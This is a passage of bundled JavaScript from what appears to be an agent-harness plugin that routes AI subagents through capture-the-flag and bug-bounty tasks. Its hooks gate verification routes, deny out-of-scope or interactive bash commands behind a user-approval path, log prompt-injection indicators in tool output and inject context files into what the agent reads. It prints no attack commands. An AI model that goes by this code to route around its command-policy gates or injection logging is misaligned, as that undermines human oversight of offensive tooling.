            const shouldSetSubagent = Boolean(dispatch.subagent_type) && (routePinned || shouldForceFailover || !config3.auto_dispatch.preserve_user_category || !hasUserDispatch);
            if (dispatch.subagent_type && shouldSetSubagent) {
              const forced = routePinned ? decision2.primary : dispatch.subagent_type;
              if (routePinned && (userCategory || userSubagent) && (userSubagent !== forced || userCategory)) {
                safeNoteWrite("task.pin", () => {
                  notesStore.recordScan(`policy-pin task: route=${decision2.primary} mode=${state2.mode} scopeConfirmed=${state2.scopeConfirmed} user_category=${userCategory || "(none)"} user_subagent=${userSubagent || "(none)"}`);
                });
              }
              args.subagent_type = forced;
              if ("category" in args) {
                delete args.category;
              }
              store.setLastTaskCategory(input.sessionID, forced);
              store.setLastDispatch(input.sessionID, decision2.primary, forced);
              if (shouldForceFailover) {
                store.consumeTaskFailover(input.sessionID);
              }
            }
            const requestedAgent = typeof args.subagent_type === "string" && args.subagent_type.length > 0 ? args.subagent_type : typeof args.category === "string" && args.category.length > 0 ? args.category : "";
            if (requestedAgent) {
              store.setLastTaskCategory(input.sessionID, requestedAgent);
              store.setLastDispatch(input.sessionID, decision2.primary, requestedAgent);
            }
            if (typeof args.prompt === "string") {
              const tail = `

[oh-my-Aegis auto-dispatch] ${dispatch.reason}`;
              if (!args.prompt.includes("[oh-my-Aegis auto-dispatch]")) {
                args.prompt = `${args.prompt}${tail}`;
              }
            }
          }
          if (!config3.auto_dispatch.enabled && routePinned) {
            if ((userCategory || userSubagent) && (userSubagent !== decision2.primary || userCategory)) {
              safeNoteWrite("task.pin", () => {
                notesStore.recordScan(`policy-pin task: route=${decision2.primary} mode=${state2.mode} scopeConfirmed=${state2.scopeConfirmed} user_category=${userCategory || "(none)"} user_subagent=${userSubagent || "(none)"}`);
              });
            }
            args.subagent_type = decision2.primary;
            if ("category" in args) {
              delete args.category;
            }
            store.setLastTaskCategory(input.sessionID, decision2.primary);
            store.setLastDispatch(input.sessionID, decision2.primary, decision2.primary);
          }
          if (typeof args.prompt === "string" && !hasPlaybookMarker(args.prompt)) {
            args.prompt = `${args.prompt}

${buildTaskPlaybook(state2, config3)}`;
          }
          const categoryRequested = typeof args.category === "string" ? args.category.trim() : "";
          const subagentRequested = typeof args.subagent_type === "string" ? args.subagent_type.trim() : "";
          if (!subagentRequested && categoryRequested) {
            args.subagent_type = categoryRequested;
            if ("category" in args) {
              delete args.category;
            }
          }
          const THINKING_MODEL_ID = "openai/gpt-5.2";
          const rawRequested = typeof args.subagent_type === "string" ? args.subagent_type.trim() : "";
          const requested = baseAgentName(rawRequested);
          if (requested && rawRequested !== requested) {
            args.subagent_type = requested;
          }
          const thinkMode = state2.thinkMode;
          const MAX_AUTO_DEEPEN_PER_SESSION = 3;
          const autoDeepenCount = state2.recentEvents.filter((e) => e === "auto_deepen_applied").length;
          const shouldAutoDeepen = state2.mode === "CTF" && isStuck(state2, config3) && autoDeepenCount < MAX_AUTO_DEEPEN_PER_SESSION;
          const shouldUltrathink = thinkMode === "ultrathink";
          const shouldThink = thinkMode === "think" && (state2.phase === "PLAN" || decision2.primary === "ctf-hypothesis" || decision2.primary === "deep-plan");
          const userPreferredModel = typeof args.model === "string" ? args.model.trim() : "";
          const userPreferredVariant = typeof args.variant === "string" ? args.variant.trim() : "";
          let preferredModel = dispatchModel;
          let preferredVariant = "";
          let thinkProfileApplied = false;
          if (requested && (shouldUltrathink || shouldThink || shouldAutoDeepen)) {
            if (!isNonOverridableSubagent(requested) && isModelHealthy(state2, THINKING_MODEL_ID, config3.dynamic_model.health_cooldown_ms)) {
              preferredModel = THINKING_MODEL_ID;
              preferredVariant = "xhigh";
              thinkProfileApplied = true;
              if (shouldAutoDeepen) {
                state2.recentEvents.push("auto_deepen_applied");
                if (state2.recentEvents.length > 30) {
                  state2.recentEvents = state2.recentEvents.slice(-30);
                }
              }
              safeNoteWrite("thinkmode.apply", () => {
                notesStore.recordScan(`Think mode profile applied: subagent=${requested}, model=${THINKING_MODEL_ID}, variant=${preferredVariant} (mode=${thinkMode} stuck=${shouldAutoDeepen} deepenCount=${autoDeepenCount})`);
              });
            } else {
              safeNoteWrite("thinkmode.skip", () => {
                notesStore.recordScan(`Think mode skipped: pro model unhealthy or non-overridable. Keeping '${requested}'. (mode=${thinkMode} stuck=${shouldAutoDeepen})`);
              });
            }
          }
          if (requested) {
            const profileMap = state2.subagentProfileOverrides;
            const overrideProfile = (isRecord8(profileMap[requested]) ? profileMap[requested] : null) ?? (isRecord8(profileMap[rawRequested]) ? profileMap[rawRequested] : null);
            if (overrideProfile) {
              const overrideModel = typeof overrideProfile.model === "string" ? overrideProfile.model.trim() : "";
              const overrideVariant = typeof overrideProfile.variant === "string" ? overrideProfile.variant.trim() : "";
              if (overrideModel) {
                preferredModel = overrideModel;
              }
              if (overrideVariant) {
                preferredVariant = overrideVariant;
              }
              if (overrideModel || overrideVariant) {
                safeNoteWrite("subagent.profile.override", () => {
                  notesStore.recordScan(`Subagent profile override applied: subagent=${requested}, model=${overrideModel || "(unchanged)"}, variant=${overrideVariant || "(unchanged)"}`);
                });
              }
            }
            if (userPreferredModel) {
              preferredModel = userPreferredModel;
            }
            if (userPreferredVariant) {
              preferredVariant = userPreferredVariant;
            }
            const resolvedProfile = resolveAgentExecutionProfile(rawRequested || requested, {
              preferredModel,
              preferredVariant
            });
            args.subagent_type = resolvedProfile.baseAgent;
            args.model = resolvedProfile.model;
            if (resolvedProfile.variant) {
              args.variant = resolvedProfile.variant;
            } else if ("variant" in args) {
              delete args.variant;
            }
            store.setLastTaskCategory(input.sessionID, resolvedProfile.baseAgent);
            store.setLastDispatch(input.sessionID, decision2.primary, resolvedProfile.baseAgent, resolvedProfile.model, resolvedProfile.variant);
            if (thinkProfileApplied) {
              safeNoteWrite("thinkmode.resolved", () => {
                notesStore.recordScan(`Think mode resolved profile: subagent=${resolvedProfile.baseAgent}, model=${resolvedProfile.model}, variant=${resolvedProfile.variant}`);
              });
            }
          }
          const finalSubagent = typeof args.subagent_type === "string" ? baseAgentName(args.subagent_type.trim()) : "";
          const verificationRoutes = new Set(["ctf-verify", "ctf-decoy-check"]);
          const envParityRequiredTargets = new Set(["PWN", "REV"]);
          if (state2.mode === "CTF" && verificationRoutes.has(finalSubagent)) {
            if (state2.phase !== "EXECUTE") {
              throw new AegisPolicyDenyError("Verification route is blocked until SCAN and PLAN are completed. Move to EXECUTE phase first.");
            }
            if (!state2.candidatePendingVerification || state2.latestCandidate.trim().length === 0) {
              throw new AegisPolicyDenyError("Verification route is blocked because no active candidate is pending verification.");
            }
            if (envParityRequiredTargets.has(state2.targetType)) {
              if (!state2.envParityChecked) {
                throw new AegisPolicyDenyError("PWN/REV verification route is blocked until env parity baseline is checked. Run `ctf_env_parity` first.");
              }
              if (!state2.envParityAllMatch) {
                throw new AegisPolicyDenyError("PWN/REV verification route is blocked because env parity mismatch was detected. Re-align environment before verification.");
              }
            }
          }
          if (state2.mode === "CTF" && finalSubagent === "ctf-verify" && state2.latestCandidate.trim().length > 0 && isLowConfidenceCandidate(state2.latestCandidate)) {
            throw new AegisPolicyDenyError("Direct ctf-verify is blocked for low-confidence or decoy-like candidate. Run ctf-decoy-check and gather stronger evidence first.");
          }
          if (thinkMode !== "none") {
            store.setThinkMode(input.sessionID, "none");
          }
          if (config3.skill_autoload.enabled) {
            const subagentType = typeof args.subagent_type === "string" ? args.subagent_type : decision2.primary;
            const autoload = resolveAutoloadSkills({
              state: state2,
              config: config3,
              subagentType,
              availableSkills
            });
            const merged = mergeLoadSkills({
              existing: args.load_skills,
              autoload,
              maxSkills: config3.skill_autoload.max_skills,
              availableSkills
            });
            if (merged.length > 0) {
              args.load_skills = merged;
            }
          }
          output.args = args;
          return;
        }
        if (input.tool !== "bash") {
          return;
        }
        const state = store.get(input.sessionID);
        const command = extractBashCommand(output.args);
        if (config3.recovery.enabled && config3.recovery.non_interactive_env) {
          const interactive = detectInteractiveCommand(command);
          if (interactive) {
            safeNoteWrite("non-interactive-env", () => {
              notesStore.recordScan(`Non-interactive guard blocked: id=${interactive.id} command=${command.slice(0, 120)}`);
            });
            throw new AegisPolicyDenyError(`[oh-my-Aegis non-interactive-env] ${interactive.reason}. Rewrite the command to be non-interactive.`);
          }
        }
        const claudeRules = getClaudeDenyRules();
        if (claudeRules.denyBash.length > 0) {
          const denied = claudeRules.denyBash.find((rule) => rule.re.test(sanitizeCommand(command)));
          if (denied) {
            throw new AegisPolicyDenyError(`Claude settings denied Bash: ${denied.raw}`);
          }
        }
        const scopePolicy = state.mode === "BOUNTY" ? getBountyScopePolicy() : null;
        const decision = evaluateBashCommand(command, config3, state.mode, {
          scopeConfirmed: state.scopeConfirmed,
          scopePolicy,
          now: new Date
        });
        if (!decision.allow) {
          const denyLevel = decision.denyLevel ?? "hard";
          if (denyLevel === "soft") {
            pruneSoftBashOverrides();
            const override = softBashOverrideByCallId.get(input.callID);
            if (override) {
              softBashOverrideByCallId.delete(input.callID);
              safeNoteWrite("bash.override", () => {
                notesStore.recordScan(`policy-override bash: reason=${override.reason || "(none)"} command=${override.command || "(empty)"}`);
              });
              return;
            }
          }
          throw new AegisPolicyDenyError(decision.reason ?? "Command blocked by Aegis policy.");
        }
      } catch (error92) {
        if (error92 instanceof AegisPolicyDenyError) {
          throw error92;
        }
        noteHookError("tool.execute.before", error92);
      }
    },
    "permission.ask": async (input, output) => {
      try {
        const state = store.get(input.sessionID);
        if (input.type.toLowerCase() !== "bash") {
          return;
        }
        const command = extractBashCommand(input.metadata);
        const scopePolicy = state.mode === "BOUNTY" ? getBountyScopePolicy() : null;
        const decision = evaluateBashCommand(command, config3, state.mode, {
          scopeConfirmed: state.scopeConfirmed,
          scopePolicy,
          now: new Date
        });
        output.status = "ask";
        if (!decision.allow) {
          pruneSoftBashOverrides();
          const denyLevel = decision.denyLevel ?? "hard";
          if (denyLevel === "soft") {
            if (input.callID) {
              softBashOverrideByCallId.set(input.callID, {
                addedAt: Date.now(),
                reason: decision.reason ?? "",
                command: decision.sanitizedCommand ?? command
              });
              output.status = "ask";
            } else {
              output.status = "deny";
            }
          } else {
            output.status = "deny";
          }
        }
      } catch (error92) {
        noteHookError("permission.ask", error92);
      }
    },
    "tool.execute.after": async (input, output) => {
      try {
        await runClaudeCompatHookBestEffort("PostToolUse", {
          session_id: input.sessionID,
          call_id: input.callID,
          tool_name: input.tool,
          tool_title: output.title
        });
        const originalTitle = output.title;
        const originalOutput = output.output;
        const raw = `${originalTitle}
${originalOutput}`;
        if (input.tool === "task") {
          const stateForPlan = store.get(input.sessionID);
          const lastBase = baseAgentName(stateForPlan.lastTaskCategory || "");
          if (lastBase === "aegis-plan" && typeof originalOutput === "string" && originalOutput.trim().length > 0) {
            safeNoteWrite("plan.snapshot", () => {
              const root = notesStore.getRootDirectory();
              const planPath = join11(root, "PLAN.md");
              const content = [
                "# PLAN",
                `updated_at: ${new Date().toISOString()}`,
                `session_id: ${input.sessionID}`,
                "",
                originalOutput.trimEnd(),
                ""
              ].join(`
`);
              writeFileSync5(planPath, content, "utf-8");
              notesStore.recordScan(`Plan snapshot updated: ${relative3(ctx.directory, planPath)}`);
            });
          }
        }
        if (config3.enable_injection_logging && notesReady) {
          const indicators = detectInjectionIndicators(raw);
          if (indicators.length > 0) {
            safeNoteWrite("tool.execute.after.injection", () => {
              notesStore.recordInjectionAttempt(`tool.${input.tool}`, indicators, raw);
            });
          }
        }
        if (isContextLengthFailure(raw)) {
          store.applyEvent(input.sessionID, "context_length_exceeded");
          maybeAutoCompactNotes(input.sessionID, "context_length_exceeded");
          await maybeShowToast({
            sessionID: input.sessionID,
            key: "context_length_exceeded",
            title: "oh-my-Aegis: context overflow",
            message: "Context length failure detected. Auto-compaction attempted.",
            variant: "warning"
          });
          await contextWindowRecoveryManager.handleContextFailureText(input.sessionID, raw);
        }
        if (isLikelyTimeout(raw)) {
          store.applyEvent(input.sessionID, "timeout");
        }
        const stateBeforeVerifyCheck = store.get(input.sessionID);
        const lastTaskBase = baseAgentName(stateBeforeVerifyCheck.lastTaskCategory || "");
        const routeVerifier = input.tool === "task" && (lastTaskBase === "ctf-verify" || lastTaskBase === "ctf-decoy-check");
        const verificationRelevant = routeVerifier || isVerificationSourceRelevant(input.tool, output.title, {
          verifierToolNames: config3.verification.verifier_tool_names,
          verifierTitleMarkers: config3.verification.verifier_title_markers
        });
        if (stateBeforeVerifyCheck.targetType === "REV") {
          const revRisk = assessRevVmRisk(raw);
          if (revRisk.signals.length > 0) {
            store.setRevRisk(input.sessionID, revRisk);
          }
        }
        if (verificationRelevant) {
          if (isVerifyFailure(raw)) {
            const contradictionEvidence = extractVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate);
            const contradictionDetected = stateBeforeVerifyCheck.mode === "CTF" && Boolean(contradictionEvidence);
            if (stateBeforeVerifyCheck.mode === "CTF" && contradictionEvidence) {
              const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
              const failedRoute = stateBeforeVerifyCheck.lastTaskCategory || route(stateBeforeVerifyCheck, config3).primary;
              store.recordFailure(input.sessionID, "static_dynamic_contradiction", failedRoute, summary);
            }
            store.applyEvent(input.sessionID, "verify_fail");
            if (contradictionDetected) {
              store.applyEvent(input.sessionID, "static_dynamic_contradiction");
            }
            await maybeShowToast({
              sessionID: input.sessionID,
              key: "verify_fail",
              title: "oh-my-Aegis: verify fail",
              message: "Verifier reported failure.",
              variant: "error"
            });
          } else if (isVerifySuccess(raw)) {
            const verifierEvidence = extractVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate);
            const strictBinaryVerifyTarget = stateBeforeVerifyCheck.mode === "CTF" && (stateBeforeVerifyCheck.targetType === "PWN" || stateBeforeVerifyCheck.targetType === "REV");
            const oracleOk = hasVerifyOracleSuccess(raw);
            const exitCodeOk = hasExitCodeZeroEvidence(raw);
            const runtimeEvidenceOk = hasRuntimeEvidence(raw);
            const parityEvidenceOk = stateBeforeVerifyCheck.envParityChecked && stateBeforeVerifyCheck.envParityAllMatch;
            const envEvidenceOk = parityEvidenceOk || runtimeEvidenceOk;
            const strictGatePassed = !strictBinaryVerifyTarget || oracleOk && exitCodeOk && envEvidenceOk;
            if (hasVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate) && verifierEvidence && strictGatePassed) {
              store.setVerified(input.sessionID, verifierEvidence);
              store.applyEvent(input.sessionID, "verify_success");
              await maybeShowToast({
                sessionID: input.sessionID,
                key: "verify_success",
                title: "oh-my-Aegis: verified",
                message: "Verifier reported success with evidence.",
                variant: "success"
              });
            } else {
              const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
              const isContradiction = strictBinaryVerifyTarget && hasVerifierEvidence(raw, stateBeforeVerifyCheck.latestCandidate);
              const failureReason = isContradiction ? "static_dynamic_contradiction" : "verification_mismatch";
              store.setFailureDetails(input.sessionID, failureReason, stateBeforeVerifyCheck.lastTaskCategory || route(stateBeforeVerifyCheck, config3).primary, summary);
              store.applyEvent(input.sessionID, "verify_fail");
              if (isContradiction) {
                store.applyEvent(input.sessionID, "static_dynamic_contradiction");
                if (!envEvidenceOk) {
                  store.applyEvent(input.sessionID, "readonly_inconclusive");
                }
              }
              await maybeShowToast({
                sessionID: input.sessionID,
                key: "verify_fail_no_evidence",
                title: "oh-my-Aegis: verify blocked",
                message: strictBinaryVerifyTarget ? "Success marker blocked by hard verify gate (oracle/exit/runtime evidence required)." : "Success marker detected but verifier evidence was missing.",
                variant: "warning"
              });
            }
          }
        }
        const classifiedFailure = classifyFailureReason(raw);
        if (classifiedFailure === "hypothesis_stall") {
          const stateForFailure = store.get(input.sessionID);
          const failedRoute = stateForFailure.lastTaskCategory || route(stateForFailure, config3).primary;
          const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
          store.setFailureDetails(input.sessionID, classifiedFailure, failedRoute, summary);
          if (/(same payload|same_payload)/i.test(raw)) {
            store.applyEvent(input.sessionID, "same_payload_repeat");
          } else {
            store.applyEvent(input.sessionID, "no_new_evidence");
          }
        } else if (classifiedFailure === "exploit_chain" || classifiedFailure === "environment" || classifiedFailure === "unsat_claim" || classifiedFailure === "static_dynamic_contradiction") {
          const stateForFailure = store.get(input.sessionID);
          const failedRoute = stateForFailure.lastTaskCategory || route(stateForFailure, config3).primary;
          const summary = raw.replace(/\s+/g, " ").trim().slice(0, 240);
          store.recordFailure(input.sessionID, classifiedFailure, failedRoute, summary);
        }
        if (input.tool === "task") {
          const state = store.get(input.sessionID);
          const isRetryableFailure = isRetryableTaskFailure(raw);
          const tokenOrQuotaFailure = isTokenOrQuotaFailure(raw);
          const useModelFailover = tokenOrQuotaFailure && config3.dynamic_model.enabled && config3.dynamic_model.generate_variants;
          const isHardFailure = !isRetryableFailure && (classifiedFailure === "verification_mismatch" || classifiedFailure === "hypothesis_stall" || classifiedFailure === "unsat_claim" || classifiedFailure === "static_dynamic_contradiction" || classifiedFailure === "exploit_chain" || classifiedFailure === "environment");
          if (isRetryableFailure) {
            store.recordDispatchOutcome(input.sessionID, "retryable_failure");
          } else if (isHardFailure) {
            store.recordDispatchOutcome(input.sessionID, "hard_failure");
          } else {
            store.recordDispatchOutcome(input.sessionID, "success");
          }
          if (tokenOrQuotaFailure) {
            const lastSubagent = state.lastTaskSubagent;
            const model = state.lastTaskModel.trim().length > 0 ? state.lastTaskModel.trim() : lastSubagent ? agentModel(lastSubagent) : undefined;
            if (model) {
              store.markModelUnhealthy(input.sessionID, model, "rate_limit_or_quota");
              safeNoteWrite("model.unhealthy", () => {
                notesStore.recordScan(`Model marked unhealthy: ${model} (via ${lastSubagent}). Dynamic failover will route to alternative model.`);
              });
            }
          }
          if (isRetryableFailure && !useModelFailover && state.taskFailoverCount < config3.auto_dispatch.max_failover_retries) {
            store.triggerTaskFailover(input.sessionID);
            await maybeShowToast({
              sessionID: input.sessionID,
              key: "task_failover_armed",
              title: "oh-my-Aegis: failover armed",
              message: `Next task will use fallback agent (attempt ${state.taskFailoverCount + 1}/${config3.auto_dispatch.max_failover_retries}).`,
              variant: "warning"
            });
            safeNoteWrite("task.failover", () => {
              notesStore.recordScan(`Auto failover armed: next task call will use fallback subagent (attempt ${state.taskFailoverCount + 1}/${config3.auto_dispatch.max_failover_retries}).`);
            });
          } else if (!isRetryableFailure && (state.pendingTaskFailover || state.taskFailoverCount > 0)) {
            store.clearTaskFailover(input.sessionID);
          }
        }
        if (input.tool === "read") {
          const entry = readContextByCallId.get(input.callID);
          if (entry) {
            readContextByCallId.delete(input.callID);
            if (config3.context_injection.enabled) {
              const rawPath = entry.filePath;
              const resolvedTarget = isAbsolute4(rawPath) ? resolve4(rawPath) : resolve4(ctx.directory, rawPath);
              const lowered = resolvedTarget.toLowerCase();
              const isContextFile = lowered.endsWith("/agents.md") || lowered.endsWith("\\agents.md") || lowered.endsWith("/readme.md") || lowered.endsWith("\\readme.md");
              if (!isContextFile && isPathInsideRoot(resolvedTarget, ctx.directory)) {
                let baseDir = resolvedTarget;
                try {
                  const st = statSync4(resolvedTarget);
                  if (st.isFile()) {
                    baseDir = dirname3(resolvedTarget);
                  }
                } catch {
                  baseDir = dirname3(resolvedTarget);
                }
                const injectedSet = injectedContextPathsFor(input.sessionID);
                const maxFiles = config3.context_injection.max_files;
                const maxPer = config3.context_injection.max_chars_per_file;
                const maxTotal = config3.context_injection.max_total_chars;
                const toInject = [];
                let current = baseDir;
                for (let depth = 0;depth < 30; depth += 1) {
                  if (!isPathInsideRoot(current, ctx.directory)) {
                    break;
                  }
                  if (config3.context_injection.inject_agents_md) {
                    const agents = join11(current, "AGENTS.md");
                    if (existsSync10(agents) && !injectedSet.has(agents) && toInject.length < maxFiles) {
                      injectedSet.add(agents);
                      toInject.push(agents);
                    }
                  }
                  if (config3.context_injection.inject_readme_md) {
                    const readme = join11(current, "README.md");
                    if (existsSync10(readme) && !injectedSet.has(readme) && toInject.length < maxFiles) {
                      injectedSet.add(readme);
                      toInject.push(readme);
                    }
                  }
                  if (toInject.length >= maxFiles) {
                    break;
                  }
                  if (resolve4(current) === resolve4(ctx.directory)) {
                    break;
                  }
                  const parent = dirname3(current);
                  if (parent === current) {
                    break;
                  }
                  current = parent;
                }
                if (toInject.length > 0) {
                  const relTarget = relative3(ctx.directory, resolvedTarget);
                  const lines = [];
                  const pushLine = (value) => {
                    lines.push(value);
                  };
                  pushLine("[oh-my-Aegis context-injector]");
                  pushLine(`read_target: ${relTarget}`);
                  pushLine("files:");
                  for (const p of toInject) {
                    pushLine(`- ${relative3(ctx.directory, p)}`);
                  }
                  pushLine("");
                  let totalChars = lines.reduce((sum, item) => sum + item.length + 1, 0);
                  for (const p of toInject) {
                    let content = "";
                    try {
                      content = readFileSync8(p, "utf-8");
                    } catch {
                      continue;
                    }
                    if (content.length > maxPer) {
                      content = `${content.slice(0, maxPer)}
...[truncated]`;
                    }
                    const rel = relative3(ctx.directory, p);
                    const block = [`--- BEGIN ${rel} ---`, content.trimEnd(), `--- END ${rel} ---`, ""].join(`
`);
                    if (totalChars + block.length + 1 > maxTotal) {
                      break;
                    }
                    totalChars += block.length + 1;
                    pushLine(block);
                  }
                  const injectedText = lines.join(`
`).trimEnd();
                  if (injectedText.length > 0) {
                    output.output = `${injectedText}

${output.output}`;
                  }
                }
              }
            }
            if (config3.rules_injector.enabled) {
              const rawPath = entry.filePath;
              const resolvedTarget = isAbsolute4(rawPath) ? resolve4(rawPath) : resolve4(ctx.directory, rawPath);
              if (isPathInsideRoot(resolvedTarget, ctx.directory)) {
                const relTarget = normalizePathForMatch(relative3(ctx.directory, resolvedTarget));
                const rules = getClaudeRules();
                const injectedSet = injectedClaudeRulePathsFor(input.sessionID);
                const maxFiles = config3.rules_injector.max_files;
                const maxPer = config3.rules_injector.max_chars_per_file;
                const maxTotal = config3.rules_injector.max_total_chars;
                const matched = rules.rules.filter((rule) => {
                  if (!rule.body)
                    return false;
                  if (injectedSet.has(rule.sourcePath))
                    return false;
                  if (rule.pathRes.length === 0)
                    return true;
                  return rule.pathRes.some((re) => re.test(relTarget));
                });
                if (matched.length > 0) {
                  const picked = [];
                  for (const rule of matched) {
                    if (picked.length >= maxFiles)
                      break;
                    injectedSet.add(rule.sourcePath);
                    picked.push(rule);
                  }
                  const lines = [];
                  const pushLine = (value) => {
                    lines.push(value);
                  };
                  pushLine("[oh-my-Aegis rules-injector]");
                  pushLine(`read_target: ${relTarget}`);
                  pushLine("rules:");
                  for (const r of picked) {
                    pushLine(`- ${r.relPath}${r.pathGlobs.length > 0 ? ` (paths=${r.pathGlobs.join(",")})` : ""}`);
                  }
                  pushLine("");
                  let totalChars = lines.reduce((sum, item) => sum + item.length + 1, 0);
                  for (const r of picked) {
                    let content = r.body;
                    if (content.length > maxPer) {
                      content = `${content.slice(0, maxPer)}
...[truncated]`;
                    }
                    const block = [`--- BEGIN ${r.relPath} ---`, content.trimEnd(), `--- END ${r.relPath} ---`, ""].join(`
`);
                    if (totalChars + block.length + 1 > maxTotal) {
                      break;
                    }
                    totalChars += block.length + 1;
                    pushLine(block);
                  }
                  const injectedText = lines.join(`
`).trimEnd();
                  if (injectedText.length > 0) {
                    output.output = `${injectedText}

${output.output}`;
                    safeNoteWrite("rules-injector", () => {
                      notesStore.recordScan(`Rules injected: count=${picked.length} target=${relTarget}`);
                    });
                  }
                }
              }
            }
          }
        }
        if (config3.comment_checker.enabled) {
          const state = store.get(input.sessionID);
          const onlyInBounty = config3.comment_checker.only_in_bounty;
          if (!onlyInBounty || state.mode === "BOUNTY") {
            const text = typeof originalOutput === "string" ? originalOutput : "";
            const looksLikePatch = text.includes("*** Begin Patch") || text.includes("diff --git") || /(^|\n)@@\s*[-+]?\d+/.test(text);
            if (looksLikePatch) {
              const addedLines = [];
              const lines = text.split(/\r?\n/);
              for (const line of lines) {
                if (!line.startsWith("+")) {
                  continue;
                }
                if (line.startsWith("+++")) {
                  continue;
                }
                const content = line.slice(1);
                if (!content.trim()) {
                  continue;
                }
                addedLines.push(content);
              }
              if (addedLines.length >= config3.comment_checker.min_added_lines) {
                const isCommentLine = (value) => {
                  const trimmed = value.trimStart();
                  if (!trimmed)
                    return false;
                  return trimmed.startsWith("//") || trimmed.startsWith("#") || trimmed.startsWith("/*") || trimmed.startsWith("*") || trimmed.startsWith("<!--");
                };
                const commentLines = addedLines.filter(isCommentLine);
                const ratio = addedLines.length > 0 ? commentLines.length / addedLines.length : 0;
                const aiSlopMarkers = ["as an ai", "chatgpt", "claude", "llm", "generated by", "ai-generated"];
                const aiSlopDetected = commentLines.some((line) => {
                  const lowered = line.toLowerCase();
                  return aiSlopMarkers.some((marker) => lowered.includes(marker));
                });
                const triggered = aiSlopDetected || ratio >= config3.comment_checker.max_comment_ratio || commentLines.length >= config3.comment_checker.max_comment_lines;
                if (triggered) {
                  const header = `[oh-my-Aegis comment-checker] added=${addedLines.length} comment=${commentLines.length} ratio=${ratio.toFixed(2)}${aiSlopDetected ? " ai_slop=detected" : ""}`;
                  const hint = "Hint: reduce non-essential comments (especially AI-style disclaimers).";
                  if (typeof output.output === "string" && !output.output.startsWith("[oh-my-Aegis comment-checker]")) {
                    output.output = `${header}
${hint}

${output.output}`;
                  }
                  safeNoteWrite("comment-checker", () => {
                    notesStore.recordScan(`${header} tool=${input.tool}`);
                  });
                }
              }
            }
          }
        }
        if (config3.recovery.enabled && config3.recovery.edit_error_hint) {
          const toolLower = String(input.tool || "").toLowerCase();
          if (toolLower === "edit" || toolLower === "write") {
            const lower = raw.toLowerCase();
            const hasPatchTerms = /(apply_patch|patch|hunk|anchor|offset|failed to apply)/i.test(lower);
            const hasFailureTerms = /(verification failed|failed|error|cannot|unable|not found|mismatch)/i.test(lower);
            if (hasPatchTerms && hasFailureTerms) {
              const hint = [
                "[oh-my-Aegis recovery]",
                "- Detected edit/patch application error.",
                "- Next: re-read the target file, shrink the patch hunk, and retry."
              ].join(`
`);
              if (typeof output.output === "string" && !output.output.startsWith("[oh-my-Aegis recovery]")) {
                output.output = `${hint}

${output.output}`;
              }
              safeNoteWrite("recovery.edit", () => {
                notesStore.recordScan(`Edit recovery hint emitted: tool=${input.tool}`);
              });
            }
          }
        }
        if (config3.tool_output_truncator.enabled) {
          const perTool = config3.tool_output_truncator.per_tool_max_chars ?? {};
          const configured = perTool[input.tool];
          const max = typeof configured === "number" && Number.isFinite(configured) ? configured : config3.tool_output_truncator.max_chars;
          if (typeof output.output === "string" && output.output.length > max) {
            const pre = output.output;
            const persistedOutput = config3.tool_output_truncator.persist_mask_sensitive ? maskSensitiveToolOutput(pre) : pre;
            const savedPath = writeToolOutputArtifact({
              sessionID: input.sessionID,
              tool: input.tool,
              callID: input.callID,
              title: originalTitle,
              output: persistedOutput
            });
            const headTarget = config3.tool_output_truncator.head_chars;
            const tailTarget = config3.tool_output_truncator.tail_chars;
            const safeHead = Math.max(0, Math.min(headTarget, max));
            const safeTail = Math.max(0, Math.min(tailTarget, Math.max(0, max - safeHead)));
            const truncated = truncateWithHeadTail(pre, safeHead, safeTail);
            const savedRel = savedPath && isPathInsideRoot(savedPath, ctx.directory) ? relative3(ctx.directory, savedPath) : savedPath;
            output.output = [
              "[oh-my-Aegis tool-output-truncated]",
              `- tool=${input.tool} callID=${input.callID}`,
              savedRel ? `- saved=${savedRel}` : "- saved=(failed)",
              `- original_chars=${pre.length}`,
              "",
              truncated
            ].join(`
`);
          }
        }
        if (config3.flag_detector?.enabled !== false) {
          const outputText = typeof output.output === "string" ? output.output : "";
          if (outputText.length > 0 && outputText.length < 1e5 && containsFlag(outputText)) {
            const flags = scanForFlags(outputText, `tool:${input.tool}`);
            if (flags.length > 0) {
              const alert = buildFlagAlert(flags);
              safeNoteWrite("flag-detector", () => {
                notesStore.recordScan(`Flag candidate detected in ${input.tool} output: ${flags.map((f) => f.flag).join(", ")}
${alert}`);
              });
            }
          }
        }
      } catch (error92) {
        noteHookError("tool.execute.after", error92);
      }
    },
    "experimental.chat.system.transform": async (input, output) => {
      if (!input.sessionID) {
        return;
      }
      const state = store.get(input.sessionID);
      const decision = route(state, config3);
      const systemLines = [
        `MODE: ${state.mode}`,
        `PHASE: ${state.phase}`,
        `TARGET: ${state.targetType}`,
        `ULTRAWORK: ${state.ultraworkEnabled ? "ENABLED" : "DISABLED"}`,
        `NEXT_ROUTE: ${decision.primary}`,
        `RULE: each loop must maintain plan + todo list (multiple todos allowed, one in_progress), then verify/log.`
      ];
      if (state.ultraworkEnabled) {
        systemLines.push(`RULE: ultrawork enabled - do not stop without verified evidence.`);
      }
      output.system.push(systemLines.join(`
`));
    },
    "experimental.session.compacting": async (input, output) => {
      const state = store.get(input.sessionID);
      output.context.push(`orchestrator-state: mode=${state.mode}, phase=${state.phase}, target=${state.targetType}, verifyFailCount=${state.verifyFailCount}`);
      output.context.push(`markdown-budgets: WORKLOG ${config3.markdown_budget.worklog_lines} lines/${config3.markdown_budget.worklog_bytes} bytes; EVIDENCE ${config3.markdown_budget.evidence_lines}/${config3.markdown_budget.evidence_bytes}`);
      try {
        const root = notesStore.getRootDirectory();
        const contextPackPath = join11(root, "CONTEXT_PACK.md");
        if (existsSync10(contextPackPath)) {
          const text = readFileSync8(contextPackPath, "utf-8").trim();
          if (text) {
            output.context.push(`durable-context:
${text.slice(0, 16000)}`);
          }
        }
        const planPath = join11(root, "PLAN.md");
        if (existsSync10(planPath)) {
          const text = readFileSync8(planPath, "utf-8").trim();
          if (text) {
            output.context.push(`durable-plan:
${text.slice(0, 12000)}`);
          }
        }
      } catch (error92) {
        noteHookError("session.compacting", error92);
      }
    },
    "experimental.text.complete": async (input, output) => {
      try {
        if (config3.recovery.enabled && config3.recovery.thinking_block_validator) {
          const fixed = sanitizeThinkingBlocks(output.text);
          if (fixed !== null) {
            output.text = fixed;
